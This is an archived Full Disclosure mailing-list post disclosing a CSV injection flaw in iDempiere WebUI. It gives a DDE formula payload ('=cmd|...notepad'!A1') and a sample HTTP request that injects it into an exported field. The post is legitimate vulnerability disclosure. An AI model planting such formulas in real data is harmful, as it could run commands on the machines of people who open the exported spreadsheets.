---
title: CSV Injection in iDempiere WebUI 12.0.0.202508171158
url: https://seclists.org/fulldisclosure/2025/Aug/12
source: Full Disclosure
date: 2025-08-20
fetch_date: 2025-10-07T00:51:08.122728
---

# CSV Injection in iDempiere WebUI 12.0.0.202508171158

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](11)
[By Date](date.html#12)
[![Next](/images/right-icon-16x16.png)](13)

[![Previous](/images/left-icon-16x16.png)](11)
[By Thread](index.html#12)
[![Next](/images/right-icon-16x16.png)](13)

![](/shared/images/nst-icons.svg#search)

# CSV Injection in iDempiere WebUI 12.0.0.202508171158

---

*From*: Ron E <ronaldjedgerson () gmail com>
*Date*: Sun, 17 Aug 2025 22:33:31 -0400

---

```
A CSV Injection vulnerability exists in iDempiere WebUI
v12.0.0.202508171158. The application fails to properly sanitize
user-supplied input before including it in exported CSV files. An
authenticated attacker can inject malicious spreadsheet formulas
(e.g., =cmd|'/C
notepad'!A1) into fields that are later exported. When the CSV is opened in
spreadsheet software such as Microsoft Excel or LibreOffice Calc, the
injected formula is executed. Successful exploitation may allow arbitrary
command execution on the victimâ€™s workstation, data exfiltration via
external cell references, or manipulation of the exported spreadsheet
content.

*Request:*

POST /webui HTTP/2

Host: <host>

-

dtid=******&cmd_0=onInitEdit&data_0=%7B%22value%22%3A%22%3Dcmd%7C'%20%2FC%20notepad'!'A1'%22%7D&cmd_1=onBlur
--snip--

*Response:*

HTTP/2 200 OK

-

{"rs"--snip--: =cmd|\' /C
notepad\'!\'A1\'',iconSclass:'z-icon-Window'},{},[]],
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](11)
[By Date](date.html#12)
[![Next](/images/right-icon-16x16.png)](13)

[![Previous](/images/left-icon-16x16.png)](11)
[By Thread](index.html#12)
[![Next](/images/right-icon-16x16.png)](13)

### Current thread:

* **CSV Injection in iDempiere WebUI 12.0.0.202508171158** *Ron E (Aug 18)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")